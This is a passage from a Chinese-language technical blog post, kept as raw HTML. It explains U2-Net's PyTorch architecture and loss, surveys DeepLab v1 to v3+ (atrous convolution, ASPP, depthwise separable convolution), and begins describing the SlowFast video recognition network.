class="hljs-number">2</span>,stride=<span class="hljs-number">2</span>,ceil_mode=<span class="hljs-literal">True</span>)<br>        self.stage5 = RSU4F(<span class="hljs-number">512</span>,<span class="hljs-number">256</span>,<span class="hljs-number">512</span>)<br>        self.pool56 = nn.MaxPool2d(<span class="hljs-number">2</span>,stride=<span class="hljs-number">2</span>,ceil_mode=<span class="hljs-literal">True</span>)<br>        self.stage6 = RSU4F(<span class="hljs-number">512</span>,<span class="hljs-number">256</span>,<span class="hljs-number">512</span>)<br>        <span class="hljs-comment"># decoder</span><br>        self.stage5d = RSU4F(<span class="hljs-number">1024</span>,<span class="hljs-number">256</span>,<span class="hljs-number">512</span>)<br>        self.stage4d = RSU4(<span class="hljs-number">1024</span>,<span class="hljs-number">128</span>,<span class="hljs-number">256</span>)<br>        self.stage3d = RSU5(<span class="hljs-number">512</span>,<span class="hljs-number">64</span>,<span class="hljs-number">128</span>)<br>        self.stage2d = RSU6(<span class="hljs-number">256</span>,<span class="hljs-number">32</span>,<span class="hljs-number">64</span>)<br>        self.stage1d = RSU7(<span class="hljs-number">128</span>,<span class="hljs-number">16</span>,<span class="hljs-number">64</span>)<br>        self.side1 = nn.Conv2d(<span class="hljs-number">64</span>,out_ch,<span class="hljs-number">3</span>,padding=<span class="hljs-number">1</span>)<br>        self.side2 = nn.Conv2d(<span class="hljs-number">64</span>,out_ch,<span class="hljs-number">3</span>,padding=<span class="hljs-number">1</span>)<br>        self.side3 = nn.Conv2d(<span class="hljs-number">128</span>,out_ch,<span class="hljs-number">3</span>,padding=<span class="hljs-number">1</span>)<br>        self.side4 = nn.Conv2d(<span class="hljs-number">256</span>,out_ch,<span class="hljs-number">3</span>,padding=<span class="hljs-number">1</span>)<br>        self.side5 = nn.Conv2d(<span class="hljs-number">512</span>,out_ch,<span class="hljs-number">3</span>,padding=<span class="hljs-number">1</span>)<br>        self.side6 = nn.Conv2d(<span class="hljs-number">512</span>,out_ch,<span class="hljs-number">3</span>,padding=<span class="hljs-number">1</span>)<br>        self.outconv = nn.Conv2d(<span class="hljs-number">6</span>,out_ch,<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br><br>        hx = x<br>        <span class="hljs-comment">#stage 1</span><br>        hx1 = self.stage1(hx)<br>        <span class="hljs-comment">#通过一个个Unet得到相应的mask</span><br>        hx = self.pool12(hx1)<br>        <span class="hljs-comment">#stage 2</span><br>        hx2 = self.stage2(hx)<br>        hx = self.pool23(hx2)<br>        <span class="hljs-comment">#stage 3</span><br>        hx3 = self.stage3(hx)<br>        hx = self.pool34(hx3)<br>        <span class="hljs-comment">#stage 4</span><br>        hx4 = self.stage4(hx)<br>        hx = self.pool45(hx4)<br>        <span class="hljs-comment">#stage 5</span><br>        hx5 = self.stage5(hx)<br>        hx = self.pool56(hx5)<br>        <span class="hljs-comment">#stage 6</span><br>        hx6 = self.stage6(hx)<br>        hx6up = _upsample_like(hx6,hx5)<br>        <span class="hljs-comment">#-------------------- decoder --------------------</span><br>        hx5d = self.stage5d(torch.cat((hx6up,hx5),<span class="hljs-number">1</span>))<br>        <span class="hljs-comment">#这里类似FPN。每个block的输出结果和上一个（下一个block）结果做融合（cat），然后输出。</span><br>        hx5dup = _upsample_like(hx5d,hx4)<br>        <span class="hljs-comment">#由于每个block做了下采样，为了resize到原图，需要做一个上采样，这里作者直接用的双线性插值做的上采样</span><br>        hx4d = self.stage4d(torch.cat((hx5dup,hx4),<span class="hljs-number">1</span>))<br>        hx4dup = _upsample_like(hx4d,hx3)<br>        hx3d = self.stage3d(torch.cat((hx4dup,hx3),<span class="hljs-number">1</span>))<br>        hx3dup = _upsample_like(hx3d,hx2)<br>        hx2d = self.stage2d(torch.cat((hx3dup,hx2),<span class="hljs-number">1</span>))<br>        hx2dup = _upsample_like(hx2d,hx1)<br>        hx1d = self.stage1d(torch.cat((hx2dup,hx1),<span class="hljs-number">1</span>))<br><br><br>        <span class="hljs-comment">#side output</span><br>        d1 = self.side1(hx1d)<br><span class="hljs-comment">#这里本质就是把每一个block输出结果，转换成WxHx1的mask最后过一个sigmod就可以得到每个block输出的概率图。</span><br>        d2 = self.side2(hx2d)<br>        d2 = _upsample_like(d2,d1)<br><br>        d3 = self.side3(hx3d)<br>        d3 = _upsample_like(d3,d1)<br><br>        d4 = self.side4(hx4d)<br>        d4 = _upsample_like(d4,d1)<br><br>        d5 = self.side5(hx5d)<br>        d5 = _upsample_like(d5,d1)<br><br>        d6 = self.side6(hx6)<br>        d6 = _upsample_like(d6,d1)<br><br>        d0 = self.outconv(torch.cat((d1,d2,d3,d4,d5,d6),<span class="hljs-number">1</span>))<br><span class="hljs-comment">#6个blovk cat一起之后做特征融合，然后再做输出，结果就是d0的结果，其他的输出都是为了计算loss</span><br>        <span class="hljs-keyword">return</span> F.sigmoid(d0), F.sigmoid(d1), F.sigmoid(d2), F.sigmoid(d3), F.sigmoid(d4), F.sigmoid(d5), F.sigmoid(d6)<br><br></code></pre></td></tr></table></figure><p>具体的对于每个RSU来说</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RSU7</span>(nn.Module):<span class="hljs-comment">#UNet07DRES(nn.Module):</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, in_ch=<span class="hljs-number">3</span>, mid_ch=<span class="hljs-number">12</span>, out_ch=<span class="hljs-number">3</span></span>):<br>        <span class="hljs-built_in">super</span>(RSU7,self).__init__()<br><br>        self.rebnconvin = REBNCONV(in_ch,out_ch,dirate=<span class="hljs-number">1</span>)<br><br>        self.rebnconv1 = REBNCONV(out_ch,mid_ch,dirate=<span class="hljs-number">1</span>)<br>        self.pool1 = nn.MaxPool2d(<span class="hljs-number">2</span>,stride=<span class="hljs-number">2</span>,ceil_mode=<span class="hljs-literal">True</span>)<br><br>        self.rebnconv2 = REBNCONV(mid_ch,mid_ch,dirate=<span class="hljs-number">1</span>)<br>        self.pool2 = nn.MaxPool2d(<span class="hljs-number">2</span>,stride=<span class="hljs-number">2</span>,ceil_mode=<span class="hljs-literal">True</span>)<br><br>        self.rebnconv3 = REBNCONV(mid_ch,mid_ch,dirate=<span class="hljs-number">1</span>)<br>        self.pool3 = nn.MaxPool2d(<span class="hljs-number">2</span>,stride=<span class="hljs-number">2</span>,ceil_mode=<span class="hljs-literal">True</span>)<br><br>        self.rebnconv4 = REBNCONV(mid_ch,mid_ch,dirate=<span class="hljs-number">1</span>)<br>        self.pool4 = nn.MaxPool2d(<span class="hljs-number">2</span>,stride=<span class="hljs-number">2</span>,ceil_mode=<span class="hljs-literal">True</span>)<br><br>        self.rebnconv5 = REBNCONV(mid_ch,mid_ch,dirate=<span class="hljs-number">1</span>)<br>        self.pool5 = nn.MaxPool2d(<span class="hljs-number">2</span>,stride=<span class="hljs-number">2</span>,ceil_mode=<span class="hljs-literal">True</span>)<br><br>        self.rebnconv6 = REBNCONV(mid_ch,mid_ch,dirate=<span class="hljs-number">1</span>)<br><br>        self.rebnconv7 = REBNCONV(mid_ch,mid_ch,dirate=<span class="hljs-number">2</span>)<br><br>        self.rebnconv6d = REBNCONV(mid_ch*<span class="hljs-number">2</span>,mid_ch,dirate=<span class="hljs-number">1</span>)<br>        self.rebnconv5d = REBNCONV(mid_ch*<span class="hljs-number">2</span>,mid_ch,dirate=<span class="hljs-number">1</span>)<br>        self.rebnconv4d = REBNCONV(mid_ch*<span class="hljs-number">2</span>,mid_ch,dirate=<span class="hljs-number">1</span>)<br>        self.rebnconv3d = REBNCONV(mid_ch*<span class="hljs-number">2</span>,mid_ch,dirate=<span class="hljs-number">1</span>)<br>        self.rebnconv2d = REBNCONV(mid_ch*<span class="hljs-number">2</span>,mid_ch,dirate=<span class="hljs-number">1</span>)<br>        self.rebnconv1d = REBNCONV(mid_ch*<span class="hljs-number">2</span>,out_ch,dirate=<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br><br>        hx = x<br>        hxin = self.rebnconvin(hx)<br><br>        hx1 = self.rebnconv1(hxin)<br>        hx = self.pool1(hx1)<br><br>        hx2 = self.rebnconv2(hx)<br>        hx = self.pool2(hx2)<br><br>        hx3 = self.rebnconv3(hx)<br>        hx = self.pool3(hx3)<br><br>        hx4 = self.rebnconv4(hx)<br>        hx = self.pool4(hx4)<br><br>        hx5 = self.rebnconv5(hx)<br>        hx = self.pool5(hx5)<br><br>        hx6 = self.rebnconv6(hx)<br><br>        hx7 = self.rebnconv7(hx6)<br><br>        hx6d =  self.rebnconv6d(torch.cat((hx7,hx6),<span class="hljs-number">1</span>))<br>        hx6dup = _upsample_like(hx6d,hx5)<br><span class="hljs-comment">#双线性差值做的上采样</span><br>        hx5d =  self.rebnconv5d(torch.cat((hx6dup,hx5),<span class="hljs-number">1</span>))<br>        hx5dup = _upsample_like(hx5d,hx4)<br><br>        hx4d = self.rebnconv4d(torch.cat((hx5dup,hx4),<span class="hljs-number">1</span>))<br>        hx4dup = _upsample_like(hx4d,hx3)<br><br>        hx3d = self.rebnconv3d(torch.cat((hx4dup,hx3),<span class="hljs-number">1</span>))<br>        hx3dup = _upsample_like(hx3d,hx2)<br><br>        hx2d = self.rebnconv2d(torch.cat((hx3dup,hx2),<span class="hljs-number">1</span>))<br>        hx2dup = _upsample_like(hx2d,hx1)<br><br>        hx1d = self.rebnconv1d(torch.cat((hx2dup,hx1),<span class="hljs-number">1</span>))<br><br>        <span class="hljs-keyword">return</span> hx1d + hxin<br></code></pre></td></tr></table></figure><p>对应结构图本质其实是这样的：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_20-17-55-20221204%2022:02:46.png" alt="Snipaste_2022-12-04_20-17-55"></p><p>RSU和ResNet的残差结构其实非常的相似。只不过将权重层换成了Unet而已。</p><p>最后我们来看下loss：</p><p>由于作者把U2net分成了多个block，每个block输出一个loss，那么最后整个模型的loss本质其实就是7个loss相加（6个block输出结果加1个特征融合后的结果）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">muti_bce_loss_fusion</span>(<span class="hljs-params">d0, d1, d2, d3, d4, d5, d6, labels_v</span>):<br><br>loss0 = bce_loss(d0,labels_v)<br>loss1 = bce_loss(d1,labels_v)<br>loss2 = bce_loss(d2,labels_v)<br>loss3 = bce_loss(d3,labels_v)<br>loss4 = bce_loss(d4,labels_v)<br>loss5 = bce_loss(d5,labels_v)<br>loss6 = bce_loss(d6,labels_v)<br><br>loss = loss0 + loss1 + loss2 + loss3 + loss4 + loss5 + loss6<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;l0: %3f, l1: %3f, l2: %3f, l3: %3f, l4: %3f, l5: %3f, l6: %3f\n&quot;</span>%(loss0.data[<span class="hljs-number">0</span>],loss1.data[<span class="hljs-number">0</span>],loss2.data[<span class="hljs-number">0</span>],loss3.data[<span class="hljs-number">0</span>],loss4.data[<span class="hljs-number">0</span>],loss5.data[<span class="hljs-number">0</span>],loss6.data[<span class="hljs-number">0</span>]))<br><br><span class="hljs-keyword">return</span> loss0, loss<br><br><span class="hljs-comment">#每个mask计算二值交叉熵最后相加</span><br>d0, d1, d2, d3, d4, d5, d6 = net(inputs_v)<br>        loss2, loss = muti_bce_loss_fusion(d0, d1, d2, d3, d4, d5, d6, labels_v)<br><br>        loss.backward()<br>        optimizer.step()<br></code></pre></td></tr></table></figure><p>可以说整个代码清晰简单好懂。但是效果确实好，我觉得好的分割检测模型就该这样，大道至简。</p><p>分割结果如下图所示，在我的实际使用中发现，如果只是前背景分割不涉及语义分割，在几个项目中有极为优秀的表现，即使背景很复杂，同时实时性非常优秀（p100前向能做到18ms）。</p><h4 id="deeplab"><a href="#deeplab" class="headerlink" title="deeplab"></a>deeplab</h4><p>DeepLab系列一共有四篇文章，分别对应DeepLab V1、DeepLab V2、DeepLab V3和DeepLab V3+。</p><p><strong>DeepLab V1</strong></p><p>论文题目：<a href="https://link.juejin.cn/?target=https://arxiv.org/abs/1606.00915">Semantic Image Segmentation with Deep Convolutional Nets and Fully Connected CRFs</a></p><p>开源代码：<a href="https://link.juejin.cn/?target=https://github.com/TheLegendAli/DeepLab-Context">TheLegendAli&#x2F;DeepLab-Context</a></p><p><strong>DeepLab V2</strong></p><p>论文题目：<a href="https://link.juejin.cn/?target=https://arxiv.org/abs/1606.00915">DeepLab: Semantic Image Segmentation with Deep Convolutional Nets, Atrous Convolution, and Fully Connected CRFs</a></p><p>开源代码：<a href="https://link.juejin.cn/?target=https://github.com/DrSleep/tensorflow-deeplab-resnet">DrSleep&#x2F;tensorflow-deeplab-resnet</a></p><p><strong>DeepLab V3</strong></p><p>论文题目：<a href="https://link.juejin.cn/?target=https://arxiv.org/abs/1706.05587">Rethinking Atrous Convolution for Semantic Image Segmentation</a></p><p>开源代码：<a href="https://link.juejin.cn/?target=https://github.com/eveningdong/DeepLabV3-Tensorflow">leonndong&#x2F;DeepLabV3-Tensorflow</a></p><p><strong>DeepLab V3+</strong></p><p>论文题目：<a href="https://link.juejin.cn/?target=https://arxiv.org/abs/1802.02611">Encoder-Decoder with Atrous Separable Convolution for Semantic Image Segmentation</a></p><p>开源代码：<a href="https://link.juejin.cn/?target=https://github.com/jfzhang95/pytorch-deeplab-xception">jfzhang95&#x2F;pytorch-deeplab-xception</a></p><p>图像分割CNN是根据classification这种high-level semantics改编的，但CNN做语义分割时精准度不够，根本原因是 DCNNs 的高级特征的平移不变性，即高层次特征映射，根源于重复的池化和下采样会丢失localization信息，即无法对像素点精确定位语义（low-level semantics）。</p><p>针对下采样或池化降低分辨率，DeepLab采用了空洞卷积代替池化操作来扩展感受野，获取更多的上下文信息。同时DeepLab v1v2 结合了深度卷积神经网络（DCNNs）和概率图模型（DenseCRFs）的方法。DeepLab v2提出了串行的ASPP模块，ASPP增强了网络在多尺度下多类别分割时的鲁棒性， 使用不同的采样比例与感受野提取输入特征，能在多个尺度上捕获目标与上下文信息，虽然大大扩展了卷积核的感受野，但<strong>随着感受野越来越接近图像大小，会退化为1x1卷积。</strong></p><p>为了解决这个问题，<strong>DeepLab v3改进了ASPP空洞卷积空间金字塔池化层，不同的dilation卷积并行操作，然后归一尺寸后求和</strong>。ASPP模块借鉴PSPNet思想，通过不同采样率的空洞卷积并行采样，捕捉图像不同尺度的上下文信息。</p><p>DeepLab v3+通过添加一个简单而有效的解码器模块扩展DeepLab v3以优化分割结果，在PASCAL VOC 2012数据集和Cityscapes数据集中分别取得了89%和82.1%的MIOU。</p><p><strong>语义分割面临的主要挑战</strong></p><p><strong>分辨率</strong> 连续的池化或下采样操作会导致图像的分辨率大幅度下降，从而损失了原始信息， 且在上采样过程中难以恢复。因此，越来越多的网络都在试图减少分辨率的损失， 比如使用空洞卷积，或者用步长为2的卷积操作代替池化。</p><p><strong>多尺度特征</strong> 同一张图片中不同大小物体的分割精度不同，因为不同尺度卷积核对不同大小物体的分割效果不同。在分辨率较小的情况下，小物体的位置信息经常被丢失，通过设置不同参数的卷积层或池化层， 提取到不同尺度的特征图。将这些特征图送入网络做融合，对于整个网络性能的提升很大。但是由于图像金字塔的多尺度输入，造成计算时保存了大量的梯度，从而导致对硬件的要求很高。</p><h5 id="deeplab-v1"><a href="#deeplab-v1" class="headerlink" title="deeplab v1"></a>deeplab v1</h5><p>DeepLab v1是结合了深度卷积神经网络（DCNNs）和概率图模型（DenseCRFs）的方法</p><p>深度卷积神经网络（DCNNs）采用FCN思想，修改VGG16网络，得到 coarse score map并插值到原图像大小，使用Atrous convolution得到更dense且感受野不变的feature map</p><p>概率图模型（DenseCRFs）借用fully connected CRF对从DCNNs得到的分割结果进行细节上的refine。</p><p>DeepLab v1：VGG16+空洞卷积+CRF对边缘分割结果进行后处理。针对下采样或池化降低分辨率，DeepLab采用了空洞卷积来扩展感受野，获取更多的上下文信息。同时，采用完全连接的条件随机场（CRF）提高模型捕获细节的能力。</p><p><strong>网络结构</strong></p><p>把全连接层（fc6、fc7、fc8）改成卷积层（端到端训练） 2.把最后两个池化层（pool4、pool5）的步长2改成1（保证feature的分辨率下降到原图的1&#x2F;8）。 3.把最后三个卷积层（conv5_1、conv5_2、conv5_3）的dilate rate设置为2，且第一个全连接层的dilate rate设置为4（保持感受野）。 4.把最后一个全连接层fc8的通道数从1000改为21（分类数为21）。 5.第一个全连接层fc6， 通道数从4096变为1024， 卷积核大小从7x7变为3x3，后续实验中发现此处的dilate rate为12时（LargeFOV），效果最好。</p><p>网络变形： DeepLab-MSc：类似FCN，加入特征融合 DeepLab-7×7：替换全连接的卷积核大小为7× 7 DeepLab-4×4：替换全连接的卷积核大小为4× 4 DeepLab-LargeFOV：替换全连接的卷积核大小为3×3，空洞率为12</p><p>损失函数：交叉熵 + softmax 优化器：SGD + momentum 0.9 batchsize：20 学习率：10^−3（每经过2000个epoch，学习率 * 0.1）</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_20-29-10-20221204%2022:02:59.png" alt="Snipaste_2022-12-04_20-29-10"></p><h5 id="deeplab-v2"><a href="#deeplab-v2" class="headerlink" title="deeplab v2"></a>deeplab v2</h5><p>VGG16&#x2F;ResNet+串行的ASPP模块+CRF对边缘分割结果进行后处理。添加了ASPP空洞卷积空间金字塔池化层，通过不同的dilation卷积串行操作，来取代导致浅层特征损失的池化操作，大大扩大了感受野。</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_20-29-29-20221204%2022:03:13.png" alt="Snipaste_2022-12-04_20-29-29"></p><p>空洞卷积：稠密映射，标准3×3卷积（rate为1），感受野为3；空洞卷积（rate为2），卷积核尺寸为5x5，感受野为7；空洞卷积（rate为4），卷积核尺寸为9x9，感受野为15。</p><p><strong>Network&amp;ASPP</strong></p><p>ASPP模块构成——&gt;DeepLab v1到DeepLab v2的进化——&gt;基于VGG16的DeepLab v2在v1的基础上做了进一步调整（FC6-FC8替换为ASPP）</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_20-32-20-20221204%2022:03:22.png" alt="Snipaste_2022-12-04_20-32-20"></p><p><strong>实验设置</strong></p><p>损失函数：交叉熵 + softmax 优化器：SGD + momentum 0.9 Batchsize：20 学习率策略：step：10^−3（每经过2000个epoch，学习率 * 0.1）</p><p>网络变形： LargeFOV：3×3卷积 + rate&#x3D;12(DeepLab v1最好结果) ASPP-S：r &#x3D; 2, 4, 8, 12 ASPP-L：r &#x3D; 6, 12, 18, 24</p><h5 id="deeplab-v3"><a href="#deeplab-v3" class="headerlink" title="deeplab v3"></a>deeplab v3</h5><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_20-32-58-20221204%2022:03:54.png" alt="Snipaste_2022-12-04_20-32-58"></p><p>Deeplab v3：ResNet+改进后的并行ASPP模块。随着采样率的增大，有效滤波器权重的数量（应用于有效特征的权重而不是padding补充的0）变少，在空洞率接近特征映射大小的极端情况下，3×3滤波器不是捕获整个图像上下文，而是退化为简单的1×1卷积（只有中心滤波器权重是有效的）。因此，v3使用了并行ASPP模块，最后一个分支拼接全局池化模块来捕获全局上下文信息。</p><p><strong>语义分割常用特征提取框架</strong></p><ol><li>图像金字塔：从输入图像入手，将不同尺度的图像分别送入网络进行特征提取，后期再融合。</li><li>编解码结构：编码器部分利用下采样进行特征提取，解码器部分利用上采样还原特征图尺寸。 </li><li>深度网络vs空洞卷积：经典分类算法利用连续下采样提取特征，而空洞卷积是利用不同的采样率。 </li><li>空间金字塔结构：除ASPP外，仍有其他网络使用了该思想，如SPPNet、PSPNet等。</li></ol><p><strong>网络结构</strong></p><p>经典分类算法网络架构，如ResNet ——&gt; DeepLab v3空洞卷积串行网络结构 ——&gt; DeepLab v3空洞卷积并行网络结构（调整了ASPP模块）</p><p><strong>实验设置</strong></p><p>裁剪尺寸：裁剪图片至513x513（为了更好的拟合空洞率） 学习率策略：采用poly策略，原理同v2</p><p>BN层策略：当output_stride&#x3D;16时，batchsize&#x3D;16，同时BN层做参数衰减decay&#x3D;0.9997。在增强的数据集上，以初始学习率0.007训练30K后，冻结BN层参数。当output_stride&#x3D;8时，batchsize&#x3D;8，使用初始学习率0.001训练30K。</p><h5 id="deeplab-v3-1"><a href="#deeplab-v3-1" class="headerlink" title="deeplab v3+"></a>deeplab v3+</h5><p>DeepLabv3+的核心是通过添加一个简单而有效的解码器模块来恢复对象边界（沿着对象边界来细化分割结果），扩展了DeepLab v3。以Xcepition&#x2F;ResNet为骨架，采用深度可分离卷积进行编码，在多尺度特征提取ASPP模块后再接一个简单的解码器模块。</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_20-35-03-20221204%2022:04:02.png" alt="Snipaste_2022-12-04_20-35-03"></p><p><strong>补充知识：深度可分离卷积</strong></p><p>标准卷积：标准输入图片尺寸为12×12×3，用1个5×5×3的卷积核进行卷积操作，会得到8×8×1的输出； 用256个5×5×3的卷积核进行卷积操作，会得到8×8×256的输出。 参数计算：256×5×5×3 &#x3D; 19200</p><p>分组卷积：组卷积是对输入特征图进行分组，每组分别进行卷积。 假设输入特征图的尺寸为C<em>H</em>W (12× 5×5)，输出特征图的数量为N (6)个，如果设定要分成G (3)个groups，则每组的输入特征图数量为C&#x2F;G (4)，每 组 的 输出特征图数量为N&#x2F;G (2)，每个卷积核的尺寸为(C&#x2F;G)<em>K</em>K (4×5×5)，卷积核的总数仍为N (6)个，每组的卷积核数量为N&#x2F;G (2)，每个卷积核只与其同组的输入特征图进行卷积，卷积核的总参数量为N*(C&#x2F;G)<em>K</em>K，可见，总参数量减少为原来的1&#x2F;G。</p><p>深度可分离卷积是组卷积的一种极端情况，也就是输入有多少个通道，对应的分组就有多少个组，即分组的组数&#x3D;输入特征图的通道数。</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_20-36-24-20221204%2022:04:14.png" alt="Snipaste_2022-12-04_20-36-24"></p><p>深度可分离卷积 &#x3D; 深度卷积 + 逐点卷积</p><p>深度卷积：每个5×5×1的卷积核对应输入图像中的一个通道，得到三个8×8×1的输出， 拼接后得到8×8×3的结果</p><p>逐点卷积：设置256个1×1×3的卷积核，对深度卷积的输出再进行卷积操作，最终得到 8×8×256的输出</p><p>参数计算：*深度卷积参数 &#x3D; 5×5×3 &#x3D; 75 逐点卷积参数 &#x3D; 256×1×1×3 &#x3D; 768 总参数 &#x3D; 75 + 768 &#x3D; 843 &lt;&lt; 19200</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_20-37-18-20221204%2022:04:24.png" alt="Snipaste_2022-12-04_20-37-18"></p><p>网络结构</p><p>编码器：</p><ol><li>使用DeepLab v3作为编码器结构，输出与输入尺寸之比16(output_stride &#x3D; 16)。</li><li>ASPP：一个1×1卷积 + 三个3×3卷积(rate &#x3D; {6, 12, 18}) + 全局平均池化。</li></ol><p>解码器：</p><ol><li>先把encoder的结果上采样4倍（双线性插值），然后与编码器中相对应尺寸的特征图进行拼接融合，再进行3x3的卷积， 最后上采样4倍得到最终结果</li><li>融合低层次信息前，先进行1x1的卷积， 目的是降低通道数。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_20-38-00-20221204%2022:04:35.png" alt="Snipaste_2022-12-04_20-38-00"></p><p>DeepLab v3+对Xception进行了微调：</p><ol><li><p>更深的Xception结构，原始middle flow迭代8次，微调后迭代16次。 </p></li><li><p>所有max pooling结构被stride&#x3D;2的深度可分离卷积替代。 </p></li><li><p>每个3x3的depthwise convolution（结合了空洞卷积）后都跟BN和Relu。</p></li></ol><h5 id="deeplab总结"><a href="#deeplab总结" class="headerlink" title="deeplab总结"></a>deeplab总结</h5><p>v1：修改经典分类网络(VGG16)，将空洞卷积应用于模型中，试图解决分辨率过低及提取多尺度特征问题，用CRF做后处理（VGG16+空洞卷积+CRF对边缘分割结果进行后处理）</p><p>v2：设计ASPP模块，将空洞卷积的性能发挥到最大，沿用VGG16作为主网络，尝试使用ResNet-101进行对比实验，用CRF做后处理（VGG16&#x2F;ResNet+串行的ASPP模块+CRF对边缘分割结果进行后处理）</p><p>v3：以ResNet为主网络，设计了一种串行和一种并行的DCNN网络，微调ASPP模块，取消CRF做后处理（ResNet+改进后的并行ASPP模块）</p><p>v3+：以ResNet或Xception为主网络，结合编解码结构设计了一种新的算法模型，以v3作为编码器结构，另行设计了解码器结构，取消CRF做后处理（ResNet&#x2F;Xception+并行的ASPP模块+编码器结构）</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_20-39-38-20221204%2022:04:44.png" alt="Snipaste_2022-12-04_20-39-38"></p><h4 id="maskrcnn"><a href="#maskrcnn" class="headerlink" title="maskrcnn"></a>maskrcnn</h4><h3 id="6-行为识别：对于视频序列"><a href="#6-行为识别：对于视频序列" class="headerlink" title="6. 行为识别：对于视频序列"></a>6. 行为识别：对于视频序列</h3><h4 id="slowfast"><a href="#slowfast" class="headerlink" title="slowfast"></a>slowfast</h4><p>SlowFast是Facebook在2019年ICCV的一篇视频识别论文，受到灵长类动物的视网膜神经细胞种类的启发（大约80%的细胞（P-cells）以低频运作，可以识别细节信息；而大约20%的细胞（M-cells）则以高频运作，对时间的变化敏感）。作者<strong>提出了一种新的快慢网络SlowFast架构，来实现两个分支分别对时间与空间维度进行处理分析</strong>。在Kinetics-400动作识别benchmark与AVA动作检测benchmark中得到了state-of-art的结果。</p><p>SlowFast算法整体由两个卷积分支组成：</p><ul><li><strong>Slow分支</strong>：较少的帧数以及较大的通道数学习空间语义信息。</li><li><strong>Fast分支</strong>：较大的帧数以及较少的通道数学习运动信息</li></ul><p>计算量与通道数的平方成正比，Fast分支由于通道数较少，其比较轻量化，仅仅占用整体20%的计算量。</p><p>Slow分支使用一个较大的步长τ来采集视频帧，通常设置τ为16，如果针对帧率为30的视频，这意味着大约1秒可以采集2帧，即T&#x3D;2。slow分支通道数为D，</p><p>Fast分支使用一个较小的步长来采集视频帧，步长为τ&#x2F;α，其中α通常设置为8，因此针对帧率为30的视频，1秒可以采集15帧（αT）。<strong>Fast分支通过使用较小的通道数（β D）来保持轻量化，β通常设置为的⅛</strong>。</p><p>Slow通道和Fast通道都使用3D卷积的RestNet模型。在每个分支的末端，SlowFast执行全局平均池化，然后concat两个通道的特征进行类别预测。</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_20-44-41-20221204%2022:05:02.png" alt="Snipaste_2022-12-04_20-44-41"></p><p>上图是一个SlowFast网络结构。卷积核的尺寸记作{T×S², C} ，其中T、S和C分别表示时序temporal, 空间spatial和频道Channel的数目。stride记作{temporal stride, spatial stride ^ 2}。 α &#x3D; 8 ，β &#x3D; 1&#x2F;8。τ &#x3D; 16。绿色表示高一些的时序分辨率，Fast通道中的橙色表示较少的通道。</p><p><strong>侧向连接</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_20-47-29-20221204%2022:05:12.png" 